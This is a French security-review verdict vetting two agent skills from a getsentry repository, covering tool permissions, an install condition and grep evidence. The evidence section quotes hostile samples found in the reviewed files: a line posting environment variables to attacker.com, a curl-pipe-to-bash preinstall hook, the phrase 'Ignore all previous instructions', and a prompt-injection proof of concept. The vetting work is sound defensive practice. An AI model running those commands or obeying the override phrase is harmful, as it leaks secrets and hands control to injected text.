# Verdict V4 (sécurité) — getsentry/skills : security-review, gha-security-review

Commit à épingler : `e94f22214528d69899d09c627b3315ddc3544816`. Apache-2.0 (le `LICENSE` de `security-review` ajoute l'attribution OWASP CC-BY-SA pour les références).

## Verdicts
| Skill | Verdict | Raison |
|---|---|---|
| security-review | ACCEPTÉ-LECTURE-SEULE | `allowed-tools: Read Grep Glob Bash Task` (SKILL.md l.4) : Bash non borné et `Task` (sous-agents). 31 fichiers `.md`, aucun script. |
| gha-security-review | ACCEPTÉ-LECTURE-SEULE | Même `allowed-tools: Read Grep Glob Bash Task` (l.4). 10 fichiers `.md`, aucun script. |

Condition d'installation (les deux) : retirer `Bash` et `Task` de `allowed-tools` (le texte n'en a pas besoin : les seules commandes visibles sont des `grep` en exemples). Sans cette retouche, la règle « rejeter Bash non borné » s'applique : REFUSÉ.

## Preuves
- Pas de hooks, `.mcp.json`, scripts ni binaires dans les deux dossiers (seul `LICENSE` n'est pas `.md`). Le dépôt contient aussi `agents/` (`code-simplifier.md`, `senpai.md`) et `warden.toml` : hors périmètre, ne pas copier.
- Grep des motifs : occurrences uniquement dans des exemples de code vulnérable (`references/supply-chain.md:232-258` `requests.post('https://attacker.com/data', data=os.environ)` et `preinstall: curl … | bash` ; `modern-threats.md:252` « Ignore all previous instructions » cité comme attaque ; `infrastructure/docker.md` `COPY .env`). Aucune instruction faite à l'agent de les exécuter.
- Commentaires HTML : `security-review/SKILL.md` l.8 et `gha-security-review/SKILL.md` l.7 = attributions (OWASP, blog StepSecurity), bénins ; les autres sont des exemples XSS/CSRF. `gha-security-review/references/ai-prompt-injection-via-ci.md:43-47` contient un « CLAUDE.md d'attaquant » et `<!-- Prompt injection PoC successful -->` : exemples pédagogiques, ne visent pas l'agent lecteur.
- Unicode invisible : aucun. Aucune lecture de secrets, aucun envoi de données, aucune télémétrie, aucune modification de configuration.
- Collision : `security-review` porte le même nom que le skill local `security-review` ; renommer ou n'utiliser qu'en référence.
